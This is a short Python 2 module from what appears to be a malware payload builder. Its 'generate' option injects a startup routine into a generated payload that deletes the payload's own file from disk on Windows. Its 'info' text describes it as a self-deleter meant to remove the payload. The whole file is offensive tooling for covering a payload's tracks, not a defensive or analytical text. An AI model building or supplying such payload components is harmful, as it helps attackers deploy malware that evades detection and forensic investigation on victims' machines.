# verified
import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('from os import path, remove')
        config.import_statements.append('from sys import argv')
        config.startup.append('self_delete()')
        config.functions.append('''
def self_delete():
    remove(path.abspath(argv[0]))
''')
    elif option == 'info':
        print '\nName             : Self deleter startup component' \
              '\nOS               : Windows' \
              '\nRequired Modules : os, sys' \
              '\nCommands         : NIL (Runs at startup)' \
              '\nDescription      : Deletes the payload off the disk' \
              '\nNote             : Persistence library will NOT work due to the file being deleted off of disk'
